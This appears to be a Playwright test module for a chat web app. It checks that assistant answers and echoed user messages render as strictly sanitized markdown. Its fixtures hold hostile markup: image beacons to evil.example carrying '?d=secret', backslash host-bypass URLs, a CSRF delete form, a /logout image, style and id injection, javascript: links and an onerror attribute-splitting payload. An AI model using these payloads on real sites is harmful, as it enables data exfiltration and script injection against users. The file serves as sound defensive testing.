"""Visual/browser check: chat answers render as formatted, strictly sanitized markdown.

A headless Chromium loads a seeded conversation and asserts that (1) an ordinary answer renders to real HTML
(headings, lists, bold, tables, links) with a script stripped, and (2) answers that carry hostile markup
cannot load anything from another host, request an app route, restyle the page, or run script: for loaded
history, for a freshly streamed answer and for the echoed user message. Runs in its own CI job; the whole
module is skipped when Playwright isn't installed (so the model-free suite stays green).
"""

from __future__ import annotations

import base64
import json
import os
import socket
import threading
import time
from urllib.parse import urlparse

import pytest

sync_api = pytest.importorskip("playwright.sync_api")

# An ordinary answer. It links /files/report.pdf, which the first test asserts.
MARKDOWN = (
    "## Heading here\n\n"
    "- first item\n"
    "- **bold** item\n\n"
    "| a | b |\n|---|---|\n| 1 | 2 |\n\n"
    "See [the docs](/docs/how-it-works) and /files/report.pdf for details.\n\n"
    "<script>window.__pwned = true;</script>\n"
)

# Hostile answer text. It deliberately holds no previewable /files/ link, so the file preview box (which has
# a button, an iframe and a style attribute of its own) cannot appear inside it.
HOSTILE = (
    "![local](/files/pic.png)\n\n"
    "![pixel](https://evil.example/pixel.png?d=secret)\n\n"
    "![Q&A](https://evil.example/qa.png)\n\n"
    '<img src="https://evil.example/raw.png">\n\n'
    '<img src="/\\evil.example/raw-backslash.png?d=secret">\n\n'
    "![x](/\\evil.example/md-backslash.png?d=secret)\n\n"
    '<img src="/logout">\n\n'
    "![x](/logout)\n\n"
    '<form method="post" action="/chat/1/delete"><button>Go</button><input name="x"></form>\n\n'
    "<style>body { display: none }</style>\n\n"
    '<p id="messages" style="position:fixed;top:0">shadow</p>\n\n'
    '<a href="/files/a.png&quot;onerror=&quot;window.__href=1//.png">odd</a>\n\n'
    '<a href="/files/x.png/../../logout?.png">dots</a>\n\n'
    '<a href="/\\evil.example/page">backslash link</a>\n\n'
    "[bad](javascript:window.__pwned3=true)\n\n"
    '<ol start="3"><li>three</li><li>four</li></ol>\n\n'
    "| left | right |\n|:-----|------:|\n| 1 | 2 |\n"
)

# An attribute value that holds a /files/ path and markup: linkifying after sanitising used to split it.
ALT_INJECTION = '<img src="/files/a.png" alt="x /files/b <img src=x onerror=window.__alt=1>">'


def _free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = int(s.getsockname()[1])
    s.close()
    return port


@pytest.fixture(scope="module")
def live(tmp_path_factory):
    """A real uvicorn server with a seeded org/admin and a conversation holding the three answers above."""
    import uvicorn
    from sqlalchemy import create_engine
    from sqlalchemy.orm import sessionmaker

    d = tmp_path_factory.mktemp("chatmd")
    saved = {
        k: os.environ.get(k) for k in ("ANTHILL_DB", "ANTHILL_JWT_SECRET", "ANTHILL_ENCRYPTION_KEY")
    }
    os.environ["ANTHILL_DB"] = str(d / "a.db")
    os.environ["ANTHILL_JWT_SECRET"] = "browser-test-secret-0123456789abcdef"
    os.environ["ANTHILL_ENCRYPTION_KEY"] = base64.b64encode(b"0" * 32).decode()

    import anthill.web.app as app_mod
    from anthill.web import db
    from anthill.web.crypto import make_token
    from anthill.web.db import ChatMessage, Conversation, Organization, User

    eng = create_engine(f"sqlite:///{d / 'a.db'}", connect_args={"check_same_thread": False})
    db.create_tables(eng)
    app_mod._engine = eng
    app_mod._SessionFactory = sessionmaker(bind=eng, autoflush=False, autocommit=False)
    # App startup would pull an embedding model in the background; no test may run the real ollama. The
    # autouse stub in tests/conftest.py is function-scoped and is not active while this module fixture starts.
    mp = pytest.MonkeyPatch()
    mp.setattr(app_mod, "_maybe_pull_embedding_model", lambda: None)
    mp.setattr(app_mod, "_start_model_pull", lambda *a, **k: None)
    mp.setattr(app_mod, "_maybe_autopull_vision", lambda *a, **k: None)
    s = app_mod._SessionFactory()
    o = Organization(name="A", slug="a")
    s.add(o)
    s.flush()
    u = User(org_id=o.id, email="admin@a.com", role="admin", active=True)
    s.add(u)
    s.flush()
    conv = Conversation(org_id=o.id, user_id=u.id, title="t")
    s.add(conv)
    s.flush()
    msgs = [
        ChatMessage(conversation_id=conv.id, role="assistant", content=c)
        for c in (MARKDOWN, HOSTILE, ALT_INJECTION)
    ]
    s.add_all(msgs)
    # A second conversation for the streaming test. The first conversation's history now renders a PDF preview
    # (a button and an inline style) and holds /files/pic.png, which would confound the streaming test's
    # page-wide selectors, so the streamed answer is the only thing rendered there besides its own history.
    conv2 = Conversation(org_id=o.id, user_id=u.id, title="t2")
    s.add(conv2)
    s.flush()
    s.add(ChatMessage(conversation_id=conv2.id, role="assistant", content="Hello there."))
    s.commit()
    token = make_token(u.id, o.id, "admin")
    conv_id, ids = conv.id, [m.id for m in msgs]

    port = _free_port()
    server = uvicorn.Server(
        uvicorn.Config(app_mod.app, host="127.0.0.1", port=port, log_level="warning")
    )
    thread = threading.Thread(target=server.run, daemon=True)
    thread.start()
    for _ in range(200):
        if server.started:
            break
        time.sleep(0.05)
    assert server.started, "uvicorn did not start"

    yield f"http://127.0.0.1:{port}", token, conv_id, ids, conv2.id

    server.should_exit = True
    thread.join(timeout=5)
    mp.undo()
    for k, v in saved.items():
        if v is None:
            os.environ.pop(k, None)
        else:
            os.environ[k] = v


def _script_errors(errors):
    """Every uncaught page error. All of them count: the start-up TypeError from
    reading PREVIEWABLE before it was declared is fixed (chat-history-file-links), so nothing is ignored."""
    return list(errors)


def _open(live, p, conversation=None):
    """Open the seeded chat. Returns (browser, page, outside, errors, requests): the requests that left the app,
    the page errors, and every request path made to the app itself."""
    base, token, conv_id, _ids, _conv2 = live
    conv_id = conversation or conv_id
    browser = p.chromium.launch(channel="chrome" if os.environ.get("CI") else None)
    ctx = browser.new_context(service_workers="block")
    ctx.add_cookies([{"name": "session_token", "value": token, "url": base}])
    page = ctx.new_page()
    outside, errors, local = [], [], []

    def on_request(r):
        host = urlparse(r.url).hostname
        if r.url.startswith("data:"):
            return
        (local if host == "127.0.0.1" else outside).append(r.url)

    page.on("request", on_request)
    page.on("pageerror", lambda e: errors.append(str(e)))
    page.goto(f"{base}/chat/{conv_id}", wait_until="domcontentloaded")
    page.wait_for_selector(
        f"#bubble-{live[3][0]} h2" if conversation is None else "#messages .bubble"
    )
    page.wait_for_load_state("networkidle")
    return browser, page, outside, errors, local


def test_chat_renders_sanitized_markdown(live):
    msg_id = live[3][0]
    with sync_api.sync_playwright() as p:
        browser, page, _outside, errors, _local = _open(live, p)
        try:
            bubble = page.locator(f"#bubble-{msg_id}")
            assert bubble.locator("h2").inner_text().strip() == "Heading here"
            assert bubble.locator("ul li").count() == 2
            assert bubble.locator("strong").inner_text().strip() == "bold"
            assert bubble.locator("table").count() == 1
            assert bubble.locator("td").count() == 2  # GFM table body cells
            assert bubble.locator('a[href="/docs/how-it-works"]').count() == 1
            assert bubble.locator('a[href="/files/report.pdf"]').count() == 1
            assert "**bold**" not in bubble.inner_text()
            assert bubble.locator("script").count() == 0
            assert page.evaluate("window.__pwned") in (None, False)
            assert _script_errors(errors) == []
        finally:
            browser.close()


def test_hostile_answer_makes_no_outside_request_and_loads_no_app_route(live):
    hostile_id = live[3][1]
    with sync_api.sync_playwright() as p:
        browser, page, outside, errors, local = _open(live, p)
        try:
            b = page.locator(f"#bubble-{hostile_id}")
            assert outside == []  # nothing left the app, including /\host forms
            # Only the file route is ever requested as an image; /logout and other routes never are.
            assert not any(u.endswith(("/logout",)) or "/logout?" in u for u in local)
            assert (
                b.locator("img").count() == 1
                and b.locator('img[src="/files/pic.png"]').count() == 1
            )
            for needle in ("evil.example", "/logout"):
                assert b.locator(f'img[src*="{needle}"]').count() == 0
            # The non-file images became links; the alt text is escaped once ("Q&A", not "Q&amp;A").
            assert b.locator('a[href="https://evil.example/pixel.png?d=secret"]').count() == 1
            assert b.locator('a:has-text("Q&A")').count() == 1
            assert _script_errors(errors) == []
        finally:
            browser.close()


def test_hostile_answer_has_no_controls_styles_ids_or_script_hooks(live):
    hostile_id = live[3][1]
    with sync_api.sync_playwright() as p:
        browser, page, _outside, errors, _local = _open(live, p)
        try:
            b = page.locator(f"#bubble-{hostile_id}")
            for sel in ("form", "input", "button", "style", "[style]", "[id]", "[class]", "iframe"):
                assert b.locator(sel).count() == 0, sel
            assert page.evaluate("getComputedStyle(document.body).display") != "none"
            # The injected id did not take over the real chat message list.
            assert page.evaluate(
                "document.getElementById('messages').classList.contains('chat-messages')"
            )
            # A link whose address is not exactly /files/<name> gets no preview, and nothing ran.
            assert b.locator("a + div").count() == 0
            for flag in ("__pwned3", "__href"):
                assert page.evaluate(f"window.{flag}") in (None, False)
            # The backslash link is not kept as a link; the odd and dot-segment links are plain links.
            assert (
                b.locator(
                    'a[href*="evil.example"]:not([href^="https://evil.example/pixel"]):not([href^="https://evil.example/qa"])'
                ).count()
                == 0
            )
            assert b.locator('a[href^="javascript"]').count() == 0
            assert _script_errors(errors) == []
        finally:
            browser.close()


def test_list_start_and_table_alignment_survive(live):
    hostile_id = live[3][1]
    with sync_api.sync_playwright() as p:
        browser, page, _outside, _errors, _local = _open(live, p)
        try:
            b = page.locator(f"#bubble-{hostile_id}")
            assert b.locator('ol[start="3"]').count() == 1
            assert b.locator('th[align="right"]').count() == 1
        finally:
            browser.close()


def test_markup_inside_an_attribute_cannot_split_it(live):
    alt_id = live[3][2]
    with sync_api.sync_playwright() as p:
        browser, page, outside, errors, _local = _open(live, p)
        try:
            b = page.locator(f"#bubble-{alt_id}")
            assert b.locator("[onerror]").count() == 0
            assert page.evaluate("window.__alt") in (None, False)
            assert outside == [] and _script_errors(errors) == []
        finally:
            browser.close()


def test_streamed_answer_and_echoed_message_get_the_same_policy(live):
    """Serve a fake SSE stream with hostile text and check the live bubble, the final render and the echo."""
    with sync_api.sync_playwright() as p:
        browser, page, outside, errors, _local = _open(live, p, conversation=live[4])
        try:
            payload = HOSTILE.replace("\n\n", "\n\n")
            frames = "".join(
                f"data: {json.dumps({'token': t})}\n\n" for t in (payload[:80], payload[80:])
            )
            frames += "data: [DONE]\n\n"

            def serve(route):
                route.fulfill(status=200, content_type="text/event-stream", body=frames)

            page.route("**/chat/*/stream*", serve)
            page.fill(
                "#msg-input",
                "![pixel](https://evil.example/echo.png) <form><button>Go</button></form>",
            )
            page.click("#send-btn")
            page.wait_for_selector('#messages .msg.assistant .bubble ol[start="3"]', timeout=15000)
            page.wait_for_load_state("networkidle")
            msgs = page.locator("#messages .msg")
            for sel in (
                "form",
                "input",
                "button.btn",
                "style",
                "[style]",
                "img[src*='evil']",
                "img[src*='logout']",
            ):
                assert page.locator(f"#messages .msg .bubble {sel}").count() == 0, sel
            assert (
                page.locator(
                    '#messages .msg.user .bubble a[href="https://evil.example/echo.png"]'
                ).count()
                == 1
            )
            assert (
                page.locator("#messages .msg.assistant .bubble img[src='/files/pic.png']").count()
                >= 1
            )
            assert msgs.count() >= 2
            assert outside == [] and _script_errors(errors) == []
        finally:
            browser.close()
